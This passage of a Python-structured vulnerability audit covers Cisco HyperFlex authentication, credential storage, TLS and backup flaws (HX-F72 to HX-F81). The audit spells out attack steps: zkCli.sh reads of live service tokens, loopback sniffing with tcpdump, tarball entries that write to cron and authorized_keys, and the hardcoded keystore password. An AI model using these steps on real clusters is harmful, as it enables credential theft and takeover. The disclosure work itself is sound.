                "setIfAbsentJWTSigningKey uses setValueForKeyForVersion with version=-1 (matches any) "
                "— no CAS protection against concurrent replacement."
            ),
        },
        "impact": (
            "Attacker with network access to ZK port 2181 can extract the JWT HMAC signing key "
            "and forge arbitrary admin session tokens for HyperFlex Connect REST API. "
            "Full unauthenticated access to all /rest/v1/* endpoints including cluster configuration, "
            "credential management, and intersight registration. "
            "Write path enables key replacement for persistent token forgery or platform-wide DoS."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store JWT signing key in filesystem keystore (JCEKS/PKCS12) on stCtlVM, not ZooKeeper. "
            "If ZK storage is required, create node with CREATOR_ALL_ACL (not OPEN_ACL_UNSAFE) "
            "and fix HX-F69 so ZK client authentication actually works. "
            "Migrate to asymmetric signing (RS256/ES256): public key for verification, "
            "private key never leaves stCtlVM keystore — eliminates key extraction threat entirely."
        ),
    },
    "HX-F72": {
        "title": "ServiceAccessAuthFilter Passes Through Requests with Invalid X-ServiceAccessToken Without Rejection",
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-284",
        "component": "hx-aaa / authfilter / ServiceAccessAuthFilterImpl / doFilter",
        "class": "Authentication Logic Error — Silent Pass-Through on Token Validation Failure",
        "confirmed": True,
        "evidence": {
            "filter_logic": (
                "ServiceAccessAuthFilterImpl.doFilter() bytecode: "
                "Offset 111-117: reads X-ServiceAccessToken header. "
                "Offset 119-124: if header isEmpty() -> ifne 184 (jumps to chain.doFilter). "
                "Offset 127-165: if header present: calls SSOManager.validateServiceAccessToken(token); "
                "  if null returned (invalid token): offset 153-165 logs debug, falls through to offset 184; "
                "  if exception (SSOExceptionEx): offset 168-177 logs debug, falls through to offset 184. "
                "Offset 184-187: chain.doFilter(request, response, chain) — request passed unconditionally. "
                "No HTTP 401/403 response issued on token validation failure."
            ),
            "design_intent_vs_reality": (
                "ServiceAccessAuthFilter is the service-to-service token layer in the filter chain. "
                "When token validation fails, it is designed to fall through (not reject) "
                "so the downstream SSOAuthFilter can authenticate the request as a user request. "
                "HOWEVER: for endpoints where ServiceAccessAuthFilter is the terminal auth filter "
                "(not followed by SSOAuthFilter), validation failure silently grants access. "
                "Filter chain composition is defined in web.xml / Jakarta filter-mapping; "
                "any endpoint mapped only to ServiceAccessAuthFilter lacks fallback auth."
            ),
            "bypass_surface": (
                "Presenting a syntactically valid but cryptographically invalid X-ServiceAccessToken "
                "(wrong HMAC, expired, unknown clientId) causes the filter to log debug and pass through. "
                "The filter sets no request attributes on failure — "
                "downstream code that checks for service identity attributes sees no identity, "
                "which may be treated as anonymous/default rather than rejected. "
                "The 'Authenticated=True' early-exit (offsets 43-85) is set by upstream filters only "
                "when a valid session is already established; forged/absent tokens never reach it."
            ),
        },
        "impact": (
            "Endpoints guarded only by ServiceAccessAuthFilter accept requests with "
            "invalid or absent X-ServiceAccessToken headers. "
            "Internal service endpoints assumed to require inter-service token may be reachable "
            "without valid credentials if they are not also covered by SSOAuthFilter."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "ServiceAccessAuthFilterImpl.doFilter() must explicitly return HTTP 401 "
            "when X-ServiceAccessToken is present but validateServiceAccessToken returns null or throws. "
            "Only absent header (no service-auth attempt) should fall through to downstream filters. "
            "Audit filter-mapping in web.xml: all endpoints reachable from the network must have "
            "SSOAuthFilter or equivalent in their filter chain, not ServiceAccessAuthFilter alone."
        ),
    },
    "HX-F73": {
        "title": "SshScpUtilImpl.sshToEsx Sources ESX SSH Credentials from VirtualPlatform.getNodeLogin In-Memory Cache",
        "severity": "LOW",
        "cvss": "3.1",
        "cwe": "CWE-312",
        "component": "stmgr-1.0.jar / SshScpUtilImpl / sshToEsx + anonfun$sshToEsx$1",
        "class": "Credential Handling — ESX SSH Credentials in Process Heap from ZK-Backed Cache",
        "confirmed": True,
        "evidence": {
            "bytecode_source": (
                "SshScpUtilImpl.$anonfun$sshToEsx$1 bytecode: "
                "Offset 1-8: getfield virtPlatform (VirtualPlatform interface). "
                "Offset 4: invokeinterface VirtualPlatform.getNodeLogin() -> Tuple2[String, String]. "
                "Offset 96-107: builds sshCred(host, keys=None, userPass=Some(Tuple2(user, pass))). "
                "Offset 113: invokes sshToHost(sshCred) -> SshUtilsTrait. "
                "keys=None (scala.None$.MODULE$) at offset 89: no SSH key auth used. "
                "userPass=Some(Tuple2(_1=username, _2=password)) at offsets 96-107: password auth."
            ),
            "credential_source_chain": (
                "VirtualPlatform.getNodeLogin() returns ESX (username, password) from the "
                "in-memory ZK-backed credential cache in EsxAuthZKMgmtImpl (stmgr-1.0.jar). "
                "These are the same credentials stored at ZK path under ZKEntryConstants.esx_username "
                "and ZKEntryConstants.esx_password, AES-encrypted with JCEKS keystore "
                "password 'springpath' (HX-F58). "
                "Read path: ZK world-read (HX-F55) -> AES decrypt (HX-F58 key) -> cleartext in heap. "
                "ESX SSH sessions to all cluster nodes authenticate with these credentials."
            ),
            "interaction_with_f67": (
                "HX-F67 identified that StDeployImpl generates a passphrase-less RSA key "
                "at /root/.ssh/id_rsa and uses it for SSH via enableSecureShell. "
                "SshScpUtilImpl.sshToEsx uses a DIFFERENT path: password-based SSH auth "
                "via VirtualPlatform.getNodeLogin(). These are two distinct SSH credential chains: "
                "  (1) Initial setup / enableSecureShell: RSA key (passphrase-less, /root/.ssh/id_rsa) "
                "  (2) Ongoing management: ESX password from ZK-backed EsxAuthZKMgmtImpl cache."
            ),
        },
        "impact": (
            "ESX SSH password credentials are held in process heap memory of stmgr JVM process. "
            "Process heap dump (via jmap or /proc/<pid>/mem on stCtlVM) exposes ESX passwords. "
            "The same credentials are extractable from ZK (HX-F55 + HX-F58 chain). "
            "This finding documents the in-memory credential surface as a secondary extraction path."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace long-lived in-memory credential cache with on-demand ZK reads with "
            "immediate cleartext discard after use. "
            "Use SSH key authentication (already implemented in StDeployImpl for the enableSecureShell "
            "path) for all stmgr-to-ESX SSH connections — eliminates password credential in heap. "
            "Primary remediation is HX-F58 (rotate JCEKS keystore password from 'springpath')."
        ),
    },
    "HX-F74": {
        "title": "LocalUserSessionManager.generateToken() Ignores Credentials, Returns SecureRandom.nextInt(31) — 31 Possible Token Values",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-338",
        "component": "hx-aaa / gateway / pamAuthenticator / LocalUserSessionManager / generateToken",
        "class": "Weak Token Generation — Insufficient Entropy in PAM Session Token",
        "confirmed": True,
        "evidence": {
            "bytecode": (
                "LocalUserSessionManager.generateToken(String username, String password) bytecode: "
                "Offset 11: getfield rand:SecureRandom. "
                "Offset 15: bipush 31. "
                "Offset 17: invokevirtual SecureRandom.nextInt:(I)I. "
                "Offset 20: istore_3. "
                "Offset 21: iload_3. "
                "Offset 22: invokestatic String.valueOf:(I)Ljava/lang/String. "
                "Offset 25: areturn. "
                "Both parameters (username and password) are never accessed — "
                "the method reads only rand.nextInt(31), converts to String, and returns."
            ),
            "token_space": (
                "SecureRandom.nextInt(31) produces a uniformly distributed integer in [0, 30]. "
                "Token output is one of: '0', '1', '2', ..., '30'. "
                "Entropy = log2(31) ≈ 4.95 bits. "
                "Exhaustive enumeration = 31 attempts maximum. "
                "At SSO session validation rate (not rate-limited at PAM layer), "
                "brute-force completes in under 1 second."
            ),
            "usage_context": (
                "StPamAuthentication.signIn(username, password) calls generateToken(user, pass) "
                "after successful PAM authentication, stores result in HxCredentials sdkSession field. "
                "The token is subsequently stored in AAAStoreZKPersistAgent session table "
                "(sdkSession field of SSOSessionInfo) — persisted at /rest/aaa/ ZK subtree. "
                "StPamAuthentication.validateToken(user, pass, token) calls tokenToUserNamePassword(token), "
                "which Base64-decodes and splits on ':' — incompatible with the integer token format "
                "generated by generateToken, meaning validateToken always returns false for these tokens. "
                "PAM session invalidation path is broken; the token function is vestigial."
            ),
        },
        "impact": (
            "PAM-authenticated user session tokens have only 31 possible values. "
            "If PAM session tokens are used for any re-authentication or credential recovery path, "
            "they can be guessed in at most 31 attempts with no rate limiting at the token layer. "
            "The tokenToUserNamePassword incompatibility (Base64-decode of an integer string) "
            "means the intended session invalidation flow does not work as designed, "
            "potentially leaving sessions that cannot be properly revoked."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace SecureRandom.nextInt(31) with SecureRandom.generateSeed(32) or "
            "equivalent 256-bit random value encoded as hex/Base64. "
            "Fix tokenToUserNamePassword to be compatible with the token format generated by generateToken, "
            "or remove the dead code path entirely. "
            "Use a proper session token registry (not encoding credentials in the token)."
        ),
    },
    "HX-F75": {
        "title": "Active Service Auth Tokens Stored at World-Readable ZK Path /rest/aaa/service_auth_table",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "hx-aaa / gateway / serviceAuth / HxServiceAuthentication / saveServiceAuthInfoForServiceAuthToken",
        "class": "Token Exposure — Live Service Tokens in Unauthenticated ZK",
        "confirmed": True,
        "evidence": {
            "zk_paths": (
                "HxServiceAuthentication.class constant pool: "
                "ldc #36: String '/rest/aaa/service_auth_table' — used in getChildren(), getValueForKey(), "
                "saveTokenWithClientId(), and deleteAuthToken(). "
                "saveServiceAuthInfoForServiceAuthToken stores ServiceAuthInfo JSON at "
                "/rest/aaa/service_auth_table/<token> (token-keyed child nodes). "
                "ServiceAuthInfo fields: clientId, serviceAuthToken, refreshToken, loginTime. "
                "isValidServiceAuthToken() validates by reading child nodes at this path. "
                "delClientIdSubscribersZkPathPrefix field: configured via sysmgmt.deleteClientIdSubscribers."
            ),
            "open_acl_chain": (
                "ZK path /rest/aaa/service_auth_table/* uses OPEN_ACL_UNSAFE (world:anyone:cdrwa) "
                "inherited from ZK cluster global ACL policy (HX-F55). "
                "ZK client auth permanently disabled (HX-F69 Boolean.getBoolean misuse). "
                "Any process on stCtlVM network TCP 2181 can: "
                "  (1) List children: zkCli.sh ls /rest/aaa/service_auth_table -> token list "
                "  (2) Read each: zkCli.sh get /rest/aaa/service_auth_table/<token> -> ServiceAuthInfo JSON "
                "  (3) Extract serviceAuthToken value from JSON -> valid X-ServiceAccessToken header value."
            ),
            "attack_path": (
                "Extracted X-ServiceAccessToken used in HTTP request to HyperFlex Connect REST API. "
                "ServiceAccessAuthFilterImpl.validateServiceAccessToken(token) reads same ZK path "
                "for validation — reads back the ServiceAuthInfo we just extracted, confirms clientId match. "
                "SSOManager.validateServiceAccessToken() at offset 132-135 stores HxSaJWT session info "
                "via setClientInfo, setting 'Authenticated=True' for downstream filter. "
                "Full service-level API access without any credential authentication. "
                "Additionally: write access to /rest/aaa/service_auth_table/* enables "
                "injecting attacker-controlled service tokens to impersonate any service client."
            ),
            "service_auth_table_structure": (
                "ServiceAuthInfo(clientId, serviceAuthToken, refreshToken, loginTime). "
                "serviceAuthToken is a JWT or opaque token issued by SSOManager.createServiceAuthToken(). "
                "refreshToken enables token refresh without re-authentication. "
                "All active inter-service auth sessions (e.g., hxclone -> stmgr, stmgr -> aaa) "
                "have live tokens stored in this table — extraction gives access to all service APIs."
            ),
        },
        "impact": (
            "All active HyperFlex inter-service auth tokens are exposed at ZK path "
            "/rest/aaa/service_auth_table with OPEN_ACL_UNSAFE ACL. "
            "Attacker with ZK port 2181 access can enumerate and extract valid X-ServiceAccessToken "
            "values for any registered HX service (stmgr, hxclone, arbitrator, etc.). "
            "Extracted tokens bypass ServiceAccessAuthFilterImpl validation and grant "
            "authenticated service API access. Combined with HX-F71 (JWT signing key extraction), "
            "provides two independent paths to full authentication bypass."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store service auth tokens with CREATOR_ALL_ACL (not OPEN_ACL_UNSAFE). "
            "Fix HX-F69 so ZK client authentication is actually enabled via storfs.cfg. "
            "Add token expiration enforcement and reduce token lifetime to the minimum required. "
            "Primary remediation: fix HX-F55 (ZK OPEN_ACL_UNSAFE) and HX-F69 (ZK auth disabled). "
            "Secondary: rotate all service auth tokens after ZK ACL fix."
        ),
    },
    "HX-F76": {
        "title": "connector_ctl backup Creates Unencrypted Tarball; restore Extracts Arbitrary Tarball to / Without Verification",
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-23",
        "component": "hxdc-connector / bin / connector_ctl / backup + restore operations",
        "class": "Insecure Backup — Unencrypted Backup + Unsigned Restore Enabling Arbitrary File Write",
        "confirmed": True,
        "evidence": {
            "backup_unencrypted": (
                "connector_ctl backup operation (bin/connector_ctl lines 37-43): "
                "'tar -czf $3/connector.tgz $2/db/connector.db' "
                "Creates unencrypted gzip tarball of connector.db. "
                "Source comment: '# TODO - encrypt pkg' — encryption was never implemented. "
                "connector.db is an SQLite database containing HX Data Connect configuration including "
                "Intersight registration tokens, vCenter credentials, and cloud integration secrets."
            ),
            "restore_arbitrary_write": (
                "connector_ctl restore operation (bin/connector_ctl lines 50-62): "
                "'tar xzf $3 -C /' "
                "Extracts the provided tarball to filesystem root / without: "
                "  (1) decryption (TODO - decrypt) "
                "  (2) signature or integrity verification "
                "  (3) path sanitization or chroot constraint. "
                "Any path within the tarball resolves relative to /. "
                "A crafted tarball with entries like '../../../etc/cron.d/backdoor' "
                "or '../../root/.ssh/authorized_keys' writes to arbitrary paths as the process UID."
            ),
            "tech_support_partial_redaction": (
                "connector_ctl tech_support operation (lines 22-30): "
                "Copies connector.db to support bundle, then removes lines matching 'AccessKeyId' "
                "and 'AccessKey' via sed — strips AWS credentials only. "
                "All other connector.db content (Intersight tokens, vCenter credentials, "
                "OAuth client secrets, SmartAccount info) is included unredacted in tech support bundles. "
                "Tech support bundles are transmitted to Cisco TAC — sensitive data exposure."
            ),
        },
        "impact": (
            "An attacker who can supply a crafted tarball to the connector_ctl restore operation "
            "achieves arbitrary file write to any path on the stCtlVM filesystem as the hxdp process UID. "
            "An attacker who obtains a connector_ctl backup file (unencrypted) reads all HX Data Connect "
            "credentials including Intersight registration and cloud integration tokens. "
            "Tech support bundles transmitted to Cisco TAC include vCenter, OAuth, and SmartAccount "
            "credentials that should be redacted but are not."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement backup encryption using AES-256-GCM with a key derived from the cluster UUID. "
            "Implement restore signature verification (HMAC-SHA256 of tarball contents). "
            "Replace 'tar xzf $3 -C /' with extraction to a staging directory with explicit path "
            "allowlisting before installing files to final destinations. "
            "Expand tech_support redaction to cover all credential fields in connector.db "
            "(Intersight tokens, vCenter passwords, OAuth secrets, SmartAccount credentials)."
        ),
    },
    "HX-F77": {
        "title": "hxCloneSvcMgr.createClone Passes VSS Credentials as Plaintext in TBinaryProtocol Thrift Fields Over Unencrypted TSocket (localhost:9347)",
        "severity": "MEDIUM",
        "cvss": "5.5",
        "cwe": "CWE-319",
        "component": "hxdc / hx-iscsi WAR / HxIscsiCloneMgrClient / hxCloneSvcMgr Thrift service",
        "class": "Credential Exposure — VSS Credentials Transmitted in Cleartext Over Loopback Thrift IPC",
        "confirmed": True,
        "evidence": {
            "thrift_signature": (
                "hxCloneSvcMgr.Iface.createClone signature (hxCloneSvcMgr$Iface.class): "
                "createClone(List<HxCloneConfig>, HxIscsiConsumerType, String username, String password, String serviceClientId). "
                "createClone_args._Fields static initializer: "
                "CLONE_LUN_CONFIG(ordinal=0, fieldId=1), CONSUMER_TYPE(ordinal=1, fieldId=2), "
                "USERNAME(ordinal=2, fieldId=3), PASSWORD(ordinal=3, fieldId=4), SERVICE_CLIENT_ID(ordinal=4, fieldId=5)."
            ),
            "caller_local_vars": (
                "HxIscsiCloneMgrClient.createClones local variable table (LVT): "
                "slot 2 = vssUsername (String), slot 3 = vssPassword (String). "
                "These are VSS (Volume Shadow Service) credentials for iSCSI clone operations on Windows/HyperV consumers. "
                "Passed directly to hxCloneSvcMgr$Client.createClone() at bytecode offset 53."
            ),
            "transport_plaintext": (
                "ThriftClient base class (com/springpath/hx/aaa/gateway/connect/ThriftClient.class) "
                "constructs transport at openClient(): "
                "new TSocket(host, port) -> new TFramedTransport(socket) -> new TBinaryProtocol(transport). "
                "No TSSLSocket, no TLS wrapping. All Thrift field values serialized as TBinaryProtocol "
                "byte stream over plaintext TCP. hxCloneSvcMgrPort = 9347 (localhost)."
            ),
            "logging": (
                "HxIscsiCloneMgrClient.createClones: logger.debug('createClones: {}', cloneConfigList.toString()) "
                "at bytecode offset 3 before RPC call. HxCloneConfig.toString() serializes config fields "
                "but does not directly include username/password. "
                "Credentials are still in plaintext on the wire."
            ),
        },
        "impact": (
            "Any process on the HX stCtlVM with loopback TCP access can observe VSS credentials "
            "by capturing traffic on localhost:9347 (tcpdump -i lo port 9347). "
            "VSS credentials are Windows domain or local administrator credentials used to invoke "
            "Volume Shadow Service for consistent iSCSI LUN snapshots — valid for remote Windows host access. "
            "Requires HyperV-consumer cluster configuration to be in use."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace TSocket with TSSLSocket using mutual TLS (client certificate pinned to stCtlVM CA) "
            "for all internal Thrift IPC. Port 9347 (hxCloneSvcMgr) and all other localhost Thrift ports "
            "should use the same TLS transport upgrade. "
            "Alternatively, pass credentials as encrypted blobs and decrypt only within the Thrift server "
            "using the JCEKS keystore key, never transmitting plaintext passwords over any transport."
        ),
    },
    "HX-F78": {
        "title": (
            "StMgrClient.trustAll() Globally Disables TLS Certificate Validation in Encryption WAR JVM "
            "via HttpsURLConnection.setDefaultSSLSocketFactory() with No-Op X509TrustManager"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "hxdc / encryption-1.0.0 WAR / StMgrClient / trustAll()",
        "class": "TLS Certificate Validation Bypass — Global JVM Override Exposes All Encryption WAR HTTPS Channels to MITM",
        "confirmed": True,
        "evidence": {
            "trustAll_bytecode": (
                "StMgrClient.trustAll() (encryption-1.0.0/WEB-INF/classes/.../StMgrClient.class): "
                "offset 6: new StMgrClient$1 (anonymous X509TrustManager). "
                "offset 16: SSLContext.getInstance('TLS'). "
                "offset 22-32: SSLContext.init(null, TrustManager[]{StMgrClient$1}, new SecureRandom()). "
                "offset 36-39: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()). "
                "offset 42-52: HttpsURLConnection.setDefaultHostnameVerifier(new StMgrClient$2()). "
                "setDefaultSSLSocketFactory and setDefaultHostnameVerifier are JVM-wide statics — "
                "all subsequent HttpsURLConnection instances in the encryption WAR JVM inherit these overrides."
            ),
            "trust_manager_noop": (
                "StMgrClient$1 implements javax.net.ssl.X509TrustManager: "
                "checkClientTrusted() → return (offset 0: return, accepts any client cert). "
                "checkServerTrusted() → return (offset 0: return, accepts any server cert, no chain validation). "
                "getAcceptedIssuers() → null (offset 0: aconst_null; offset 1: areturn, non-standard — "
                "JSSE implementations typically treat null as 'no accepted issuers', effectively accepting all)."
            ),
            "hostname_verifier_noop": (
                "StMgrClient$2 implements javax.net.ssl.HostnameVerifier: "
                "verify(String hostname, SSLSession session) → iconst_1; ireturn (always returns true). "
                "Certificate CN/SAN never checked against target hostname."
            ),
            "openClient_call_site": (
                "StMgrClient.openClient() offset 0: invokevirtual trustAll() — called before every connection. "
                "offset 22-35: new THttpClient(stMgrHost + '/stmgr') — stmgr accessed via HTTPS THttpClient, "
                "NOT TSocket. URL template: 'https://<stMgrHost>/stmgr' (InvokeDynamic #86 concat). "
                "offset 38-44: HxSecurity.getInstance().getLocalSessionId() → localSessionId. "
                "offset 52-57: THttpClient.setCustomHeader('X-RootSessionID', localSessionId). "
                "offset 58: new TBinaryProtocol(transport)."
            ),
            "scope_of_bypass": (
                "The encryption WAR JVM issues HTTPS connections to: stmgr (localhost), KMIP server "
                "(external key management), vCenter (optional), Intersight (optional). "
                "setDefaultSSLSocketFactory/setDefaultHostnameVerifier affect ALL HttpsURLConnection "
                "instances in the same JVM process — the bypass is not scoped to stmgr. "
                "KMIP operations (SEDConfiguration, executeEnableControllerSecuirty, "
                "executeDisableControllerSecuirty, executeCreateKmipCertPolicy) are all issued from "
                "this JVM after trustAll() pollutes the default socket factory."
            ),
            "ucsm_credential_exposure": (
                "StMgr.executeValidateLogin(ucsmHostname, ucsmUsername, ucsmPasswd, lang) called from "
                "AuthApiServiceImpl.validateUcsmLogin(UcsmCredentials) via ValidateLoginSource.validate(). "
                "UCSM credentials transmitted over the HTTPS-without-cert-validation THttpClient channel. "
                "An attacker performing MITM against the now-unvalidated TLS connection can intercept "
                "UCSM admin credentials in transit. UcsmCredentials.toString() constant pool #52='    password:' "
                "— any logger.debug(..., ucsmCredentials) also logs the cleartext password."
            ),
        },
        "impact": (
            "The encryption WAR is the trust boundary for HyperFlex drive encryption: it manages KMIP "
            "key requests, SED controller security operations, and KEK lifecycle. "
            "StMgrClient.trustAll() globally replaces the JVM default TLS socket factory with one that "
            "accepts any certificate with no CN/SAN or chain validation. "
            "A network-adjacent attacker (on the management network between the stCtlVM and its KMIP server) "
            "can present a self-signed or revoked certificate and intercept all KMIP key material — "
            "including the KEK passed to executeDisableControllerSecuirty — without triggering any error. "
            "Additionally, UCSM admin credentials relayed via executeValidateLogin are exposed to the same MITM path. "
            "Because setDefaultSSLSocketFactory operates at JVM scope (not per-connection), the bypass "
            "persists for the lifetime of the encryption WAR process and cannot be reverted by individual callers."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll() entirely. Replace with per-connection SSLContext pinned to the KMIP CA bundle "
            "and stmgr's certificate. "
            "For stmgr connectivity: configure THttpClient with an SSLContext that validates against the "
            "HyperFlex internal CA. "
            "For KMIP: enforce mutual TLS with operator-supplied KMIP CA in SEDConfiguration. "
            "UcsmCredentials.toString() should redact the password field to eliminate log exposure. "
            "Never call setDefaultSSLSocketFactory or setDefaultHostnameVerifier with accept-all implementations — "
            "these are JVM-wide and bleed across all connection pools in the process."
        ),
    },
    "HX-F79": {
        "title": (
            "stmgr.getStCtlVMSSHKeys Thrift RPC Decrypts and Returns Controller VM SSH Private Key "
            "from ZooKeeper — Plaintext Key Material Exposed Over HTTPS IPC Channel"
        ),
        "severity": "HIGH",
        "cvss": "7.2",
        "cwe": "CWE-312",
        "component": "stmgr / StMgrImpl / getStCtlVMSSHKeys / SshUtils$.decryptSSHKey",
        "class": "Sensitive Key Material Exposure — Controller VM SSH Private Key Returned in Thrift Response",
        "confirmed": True,
        "evidence": {
            "thrift_method_signature": (
                "StMgrImpl.getStCtlVMSSHKeys(Option<EntityRef>) → Future<SshKeyPair>. "
                "Returns SshKeyPair.apply(pvtkey: String, pubkey: String). "
                "pvtkey is the plaintext SSH private key of the target controller VM node."
            ),
            "decryption_chain_bytecode": (
                "StMgrImpl.getStCtlVMSSHKeys bytecode: "
                "offset 58: getstatic SshUtils$.MODULE$. "
                "offset 62: invokevirtual zkSvc_NodeQueryMgr(). "
                "offset 66: invokevirtual ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(nodeId). "
                "offset 69: invokevirtual SshUtils$.decryptSSHKey(encryptedKey) → byte[]. "
                "offset 72-75: new String(bytes, 'UTF-8') — plaintext private key as String. "
                "offset 83-100: same for public key via getStCtlSSHEncryptedPublicKey + decryptSSHKey. "
                "offset 108-114: SshKeyPair$.apply(pvtkey, pubkey). "
                "offset 117: Future$.value(sshKeyPair) — returned synchronously."
            ),
            "decryption_key_source": (
                "SshUtils$.decryptSSHKey(String) calls EncryptionUtil$.MODULE$.decryptData(encryptedKey, getEncryptionKey()). "
                "EncryptionUtil$.getEncryptionKey() → StorvisorKeystoreManager$.MODULE$.getEntry("
                "SecurityConstants$.STORVISOR_KEYSTORE_ENTRY_AES_ENCRYPTION) where "
                "STORVISOR_KEYSTORE_ENTRY_AES_ENCRYPTION = 'aes_encryption'. "
                "StorvisorKeystore path: system property 'sysmgmt.common.security.springpath_keystore_file'. "
                "Keystore password: /etc/hyperflex_shadow key 'keystore_password' "
                "(SecurityConstants$ string constant #198 = '/etc/hyperflex_shadow', #200 = 'keystore_password')."
            ),
            "zk_storage": (
                "Encrypted SSH private keys stored in ZooKeeper under paths read by "
                "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(nodeId). "
                "ZK is world-readable (HX-F55: OPEN_ACL_UNSAFE) and ZK auth is permanently disabled (HX-F69). "
                "Any process with ZK access can read encrypted key material. "
                "With /etc/hyperflex_shadow keystore_password + the JKS keystore file, "
                "decryption does not require calling the stmgr Thrift RPC."
            ),
            "auth_gate": (
                "stmgr is a Finagle HTTP/1.1 server. "
                "Server$Authenticator filter checks 'X-RootSessionID' header on every request "
                "(Server$Authenticator.checkRootSessionID(Request)). "
                "On failure: Future.exception(new GeneralSecurityException('Authentication Failed!')). "
                "JWT signing key is in ZK at world-readable path (HX-F71) — "
                "auth gate does not constitute a compensating control in this threat model."
            ),
        },
        "impact": (
            "SSH private keys of HyperFlex stCtlVM nodes are stored AES-encrypted in ZooKeeper and "
            "served decrypted over the stmgr Thrift HTTPS channel on request. "
            "A caller with a valid root session ID can retrieve the plaintext private key for any node. "
            "The decryption key (AES 'aes_encryption' entry in StorvisorKeystore) is protected only by "
            "the keystore password from /etc/hyperflex_shadow — any local process with filesystem read "
            "access can recover the keystore password, open the JKS keystore, extract the AES key, and "
            "directly decrypt SSH private keys from ZK without involving the Thrift API. "
            "Compromised controller VM SSH keys enable full lateral movement across all HX cluster nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Do not return decrypted private key material over any IPC channel. "
            "SSH key operations should remain server-side: if callers need to authenticate, "
            "delegate the SSH session to stmgr rather than exporting the private key. "
            "Protect /etc/hyperflex_shadow with strict DAC (0600, root-owned). "
            "Consider PKCS#11 HSM-backed key storage to prevent offline AES key extraction from the JKS file."
        ),
    },
    "HX-F80": {
        "title": (
            "StMgr.executeDisableControllerSecuirty Transmits SED Key Encryption Key (KEK) and UCSM "
            "Admin Credentials Inline in Single Thrift Call Over HTTPS IPC Channel"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-312",
        "component": "hxdc / encryption-1.0.0 WAR / EncryptionLocalSource / StMgrClient.executeDisableControllerSecuirty",
        "class": "Sensitive Key Material Exposure — KEK and UCSM Credentials Co-Located in Single Thrift Args Object",
        "confirmed": True,
        "evidence": {
            "thrift_signature": (
                "StMgr.executeDisableControllerSecuirty(ucsmHostname, ucsmUsername, ucsmPasswd, kek, jobType, lang). "
                "Field names from constant pool of executeDisableControllerSecuirty_args: "
                "#12=ucsmHostname, #16=ucsmUsername, #19=ucsmPasswd, #22=kek, jobType, lang. "
                "_Fields enum ordinals: UCSM_HOSTNAME(0), UCSM_USERNAME(1), UCSM_PASSWD(2), KEK(3), JOB_TYPE(4), LANG(5)."
            ),
            "kek_source_bytecode": (
                "EncryptionLocalSource.enableOrDisableControllerSecurity(Boolean, Object, String) "
                "when Boolean==false (disable path): "
                "offset 53-66: QueryLocalKeyParser.getDeployedLocalKey(lang).getSecurityKey() → storedKey. "
                "offset 73-85: storedKey.equals(requestBody.getSecurityKey()) — key verification gate. "
                "offset 88-121: extracts LocalPolicyEntityBody.{getUcsmHostname, getUsername, getPassword, getSecurityKey}. "
                "LocalPolicyEntityBody.getSecurityKey() mapped to kek field (arg position 4, Thrift fieldId=4). "
                "StMgrClient.executeDisableControllerSecuirty(hostname, username, password, securityKey, "
                "'encryptionLocalConfigDisable', lang) at offset 121."
            ),
            "kek_semantics": (
                "kek = Key Encryption Key for the SED (Self-Encrypting Drive) controller security policy. "
                "The KEK is the locally-set security passphrase that protects drive encryption keys "
                "in the local encryption policy. Its compromise allows decryption of SED-protected data "
                "without the KMIP external key manager."
            ),
            "transport_context": (
                "Transport: StMgrClient.openClient() calls trustAll() at offset 0 then opens "
                "THttpClient('https://<stMgrHost>/stmgr') — TLS cert validation globally disabled (HX-F78). "
                "An attacker performing TLS MITM (made possible by HX-F78) intercepts a single Thrift message "
                "containing UCSM admin credentials AND the SED KEK simultaneously. "
                "KEK verification at EncryptionLocalSource offset 73-85 does not protect against MITM — "
                "it only validates caller knowledge, not channel integrity."
            ),
        },
        "impact": (
            "The SED KEK and UCSM admin credentials are co-located in a single Thrift message body. "
            "A network-adjacent attacker performing TLS MITM (trivially enabled by HX-F78's global "
            "trust-all override) recovers both the drive encryption KEK and full UCSM administrative access "
            "in one intercepted message. "
            "KEK recovery enables offline decryption of SED-protected datastores. "
            "UCSM admin credentials provide full UCS domain control: server provisioning, "
            "VLAN/VSAN policy, firmware update, and service profile management across all compute nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Separate the KEK and UCSM credential flows into distinct, independently authenticated operations. "
            "Do not co-locate credentials and key material in the same Thrift call or message body. "
            "The KEK should be passed through a dedicated authenticated channel with per-operation audit logging. "
            "Fix the underlying TLS bypass (HX-F78) to ensure channel integrity; "
            "separation of concerns alone is insufficient while HX-F78 is not addressed."
        ),
    },
    "HX-F81": {
        "title": (
            "StorvisorSupportBundle /st-support/* Servlet Exposes Pre-Authentication SSRF — "
            "User-Controlled 'host' Parameter Fetched with ESX Admin Credentials via JVM-Wide Authenticator"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-918",
        "component": "ROOT-1.0.0 WAR / StorvisorSupportBundle / WebDownloader / HostCredentialsAccess",
        "class": "Pre-Authentication SSRF with Credential Forwarding — ESX Admin Credentials Exposed via 401 Challenge to Attacker-Controlled Host",
        "confirmed": True,
        "evidence": {
            "no_auth_filter": (
                "ROOT-1.0.0/WEB-INF/web.xml filter-mapping: "
                "AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth are mapped to /rest/* and /internalsupport/* only. "
                "No filter is mapped to /st-support/*. "
                "StorvisorSupportBundle servlet registered at /st-support/* with no authentication or authorization filter. "
